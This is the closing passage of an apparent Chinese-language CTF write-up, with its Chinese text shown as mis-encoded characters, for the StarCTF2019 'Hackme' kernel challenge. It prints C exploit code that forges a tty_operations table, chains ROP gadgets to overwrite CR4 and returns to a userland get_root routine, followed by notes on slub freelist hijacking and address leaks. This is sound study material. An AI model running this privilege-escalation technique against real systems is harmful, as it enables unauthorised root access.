</div>
</div><p><code>ROP Chain</code>å¸ƒç½®å¦‚ä¸‹,ä¸å¤šè¯´äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">    <span class="n">evil_buf</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">;</span>  <span class="c1">// æ­¤å¤„æŒ‡å‘ fake_tty_operations æŒ‡é’ˆä½ç½®,åªè¦æ»¡è¶³è°ƒç”¨ioctlæŒ‡é’ˆçš„æ—¶å€™è°ƒç”¨gadget1
</span><span class="c1"></span>    											<span class="c1">// è€Œè„šæœ¬æ˜¯ä» [0x80/8 + i]å¼€å§‹æ‰å­˜æ”¾gadget1æŒ‡é’ˆ,æ‰€ä»¥æ­¤å¤„æŒ‡å‘0x180åç§»å¤„		
</span><span class="c1"></span>    <span class="n">evil_buf</span><span class="p">[</span><span class="mh">0x38</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span>
   	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">evil_buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">evil_buf</span><span class="p">),</span> <span class="n">ptmx_offset</span><span class="p">);</span>
   	
   	<span class="c1">//******* ç®€å•çš„æ„é€ ROP + tty_struct è¿›è¡Œåˆ©ç”¨,å…¶ä¸­ä¿®æ”¹CR4å¯„å­˜å™¨,æ•…å¯ä»¥ret2usr
</span><span class="c1"></span>   	<span class="n">uint64_t</span> <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mh">0x80</span><span class="o">/</span><span class="mi">8</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x5DBEF</span><span class="p">;</span>
        <span class="c1">// æ”¹tty_operationsä¸­ioctlå‡½æ•°æŒ‡é’ˆå¯¹åº”çš„æŒ‡é’ˆ
</span><span class="c1"></span>        <span class="c1">// gadget 1:  mov rax, qword ptr [rbx + 0x38]; mov rdx, qword ptr [rax + 0xC8]; call rdx;
</span><span class="c1"></span>	<span class="n">fake_tty_operations</span><span class="p">[</span><span class="mh">0xC8</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x200F66</span><span class="p">;</span> <span class="c1">//gadget 2:  mov  rsp, rax;  pop  r12;  push r12; retn
</span><span class="c1"></span>    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x01B5A1</span><span class="p">;</span> <span class="c1">//pop rax ; ret
</span><span class="c1"></span>    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">=</span> <span class="mh">0x6F0</span><span class="p">;</span>
    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>  <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x0252B</span><span class="p">;</span> <span class="c1">//mov cr4, rax; push rcx; popfq; pop rbp; ret;
</span><span class="c1"></span>    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>  <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">get_root</span><span class="p">;</span>
    <span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">fake_tty_operations</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_tty_operations</span><span class="p">),</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">ptmx_fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</h3>
<pre><code>1. å †åˆ†é…: åœ¨Linux Kernelä¸­,kmallocç­‰å †å†…å­˜åˆ†é…,åŸºäº`slub`åˆ†é…å™¨,å½“é‡Šæ”¾çš„æ—¶å€™,å°†ä¼šä»¥å•å‘é“¾è¡¨çš„å½¢å¼è¿›è¡Œç»´æŠ¤;
   å…ˆå…¥åå‡ºç»“æ„,é¦–ä½8å­—èŠ‚æŒ‡å‘ä¹‹å‰é‡Šæ”¾çš„ç›¸åŒå¤§å°å †å—  
   ä¿®æ”¹æ­¤8å­—èŠ‚ä¸ºå¯æ§åœ°å€,åˆ™èƒ½å¤Ÿå®ç°ä»»æ„å†…å­˜åˆ†é…,ä¸”å½“å †å—ç”³è¯·å›æ¥,å¯ä»¥åˆ©ç”¨æ®‹ç•™æ•°æ®è·å–å †å—åœ°å€æˆ–è€…å†…æ ¸åŸºå€  
2. æ³„æ¼æ¨¡å—é©±åŠ¨åŠ è½½åœ°å€: æƒé™è¶³å¤Ÿ,å¯ä»¥è¯»å–`/proc/kallsyms` æˆ–è€… `cat /sys/modules/device_name/section/.text`,ä»è€Œè·å–æ¨¡å—é©±åŠ¨åŠ è½½åœ°å€
</code></pre><h3 id="reference">&ldquo;Reference&rdquo;</h3>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2ODM4NzUyNQ==&amp;mid=2247483991&amp;idx=1&amp;sn=e32e083187f7cc22e27af26df7c9687a&amp;scene=19#wechat_redirect">[linuxå†…æ ¸æ¼æ´åˆ©ç”¨]call_usermodehelperææƒè·¯å¾„å˜é‡æ€»ç»“</a><br>
<a href="../attachment/StarCTF2019_Hackme.zip">[é™„ä»¶]</a></p>

    </div>
</div>

<div class="container">
    
    <nav class="flex container suggested">
        
        
        
        <a rel="next" href="/articles/%E9%80%9A%E8%BF%87dasctfhws%E8%B5%9B%E9%A2%98babycall%E6%9D%A5%E6%8E%A2%E7%A9%B6%E7%BB%95%E8%BF%87kpti%E4%BF%9D%E6%8A%A4/" title="Next post (newer)">
            <span>Next</span>
            é€šè¿‡DASCTF&amp;HWSèµ›é¢˜babycallæ¥æ¢ç©¶ç»•è¿‡KPTIä¿æŠ¤
            </a> 
        
    </nav>
    
</div>
</main>


        </main>
        <footer class="footer flex">
    <section class="container">
        <nav class="footer-links">
            
            <a href="/index.xml">RSS</a>
            
        </nav>
    </section>
    
    <script async src="/js/features.min.a94f58a30ad2560de728e080d87f75c60cf806fd1b3d5f4815f1a1a02c0d1859.js"></script>
</footer>
    </body>
</html>